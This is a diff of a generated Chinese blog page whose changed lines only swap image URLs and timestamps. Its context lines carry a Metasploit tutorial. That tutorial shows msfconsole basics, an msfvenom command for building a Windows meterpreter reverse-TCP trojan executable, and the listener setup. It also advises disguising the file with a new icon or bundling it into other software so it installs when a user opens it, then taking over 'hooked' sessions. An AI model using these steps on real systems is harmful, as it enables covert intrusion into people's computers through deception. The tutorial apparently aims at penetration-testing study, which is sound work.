@@ -32,17 +32,17 @@
 <meta property="og:site_name" content="qnjy&#39;s blog">
 <meta property="og:description" content="1 什么是MSFMetasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。 Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png">
-<meta property="og:image" content="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324110431455.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324203338674.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325120742191.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121212843.png">
+<meta property="og:image" content="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121313086.png">
 <meta property="article:published_time" content="2022-03-24T02:08:24.000Z">
-<meta property="article:modified_time" content="2022-03-27T12:19:43.363Z">
+<meta property="article:modified_time" content="2022-03-27T13:07:57.330Z">
 <meta property="article:author" content="qnjy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png">
+<meta name="twitter:image" content="https://gitee.com/q1jy/images/blob/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png">
 
 
 <link rel="canonical" href="https://qnjy.github.io/post/4cf34f0f.html">
@@ -330,7 +330,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-03-27 20:19:43" itemprop="dateModified" datetime="2022-03-27T20:19:43+08:00">2022-03-27</time>
+        <time title="修改时间：2022-03-27 21:07:57" itemprop="dateModified" datetime="2022-03-27T21:07:57+08:00">2022-03-27</time>
       </span>
 
   
@@ -352,7 +352,7 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
 <p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
+<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
 <p>模块分为：</p>
 <p>辅助模块———————AUX</p>
 <p>渗透攻击模块————exploits</p>
@@ -362,19 +362,19 @@
 <p>空指令模块——————nops</p>
 <h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
 <li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
-<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
+<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
 </li>
 <li><p>常用命令</p>
 <p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
 <p>比如<code>search ms17_010</code>搜索这个漏洞</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
+<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
 <p>rank是等级，按可靠性降序排列</p>
 <p>excellent——-great—good—-normal—-average—-low—-manual</p>
 </li>
 </ol>
 <h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
 <li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
 </li>
 <li><p><code>msfconsole</code>打开msf</p>
 </li>
@@ -385,7 +385,7 @@
 <p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
 <p>(5)命令： <code>show options</code>（查看设置参数）</p>
 <p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
+<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
 </li>
 <li><p>在靶机打开可执行文件</p>
 <p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
@@ -393,7 +393,7 @@
 <li><p>查看用户</p>
 <p>(1)命令：sessions（查看上钩用户）</p>
 <p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
+<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
 <p>出现meterpreter就已经成功了</p>
 </li>
 <li><p>meterpreter入侵对方电脑的命令</p>
